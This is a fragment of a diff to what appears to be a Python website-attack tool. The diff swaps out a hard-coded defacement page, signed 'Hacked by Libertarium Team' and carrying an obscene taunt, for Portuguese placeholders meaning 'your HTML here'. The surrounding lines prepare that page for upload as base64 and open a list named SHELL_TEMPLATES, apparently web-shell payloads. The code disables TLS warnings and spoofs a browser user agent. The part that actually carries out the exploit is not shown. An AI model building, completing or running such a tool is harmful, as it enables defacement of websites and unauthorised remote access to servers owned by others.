@@ -12,73 +12,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
-POC_FILENAME = "hacked.html"
-POC_CONTENT = """<html>
-<head>
-    <title>Hacked by Libertarium Team </title>
-    <style>
-        body {
-            background-color: black;
-            color: white;
-            font-family: Tahoma, sans-serif;
-        }
-
-        .image-row {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px; 
-            margin: 20px 0;
-        }
-
-        .image-row img {
-            display: block;
-        }
-
-        .center-img {
-            height: 220px;
-            width: 220px;
-        }
-
-        .small-img {
-            height: 180px;
-            width: 280px;
-        }
-
-        .cyberteam {
-            text-align: center;
-            font-weight: bold;
-            font-size: 18px;
-        }
-
-        .cyber {
-            color: white;
-        }
-
-        .team {
-            color: red;
-        }
-    </style>
-</head>
-<body>
-    <div class="image-row">
-        <img class="small-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQgiFBtarM4yj4gylpKMrexKws05lSLI0ESzQ&s" />
-        <img class="center-img" src="https://irmandadechat.neocities.org/lbt.webp" />
-        <img class="small-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSYCUE5ju6aDkUSABgrasuGzE2YSv7gRk9q89XOsPZlgGj_XxpYjZw2ECIz&s=10" />
-    </div>
-
-    <h1 style="font-size: 18px; text-align: center;">
-        
-    </h1>
-    <br>
-    <p class="cyberteam">
-      HACKED BY <span class="cyber">BR</span><span class="team"> Libertarium Team.</span>
-    </p>
-    <br><br>
-    <center> Defacer:Elite'Xsp4m </center>
-    <center style="color: red;">FUCKING YOUR SYSTEM</center>
-</body>
-</html> """
+POC_FILENAME = "nome_do.html"
+POC_CONTENT = """seu_html_aqui"""
 POC_B64 = base64.b64encode(POC_CONTENT.encode()).decode()
 
 SHELL_TEMPLATES = [
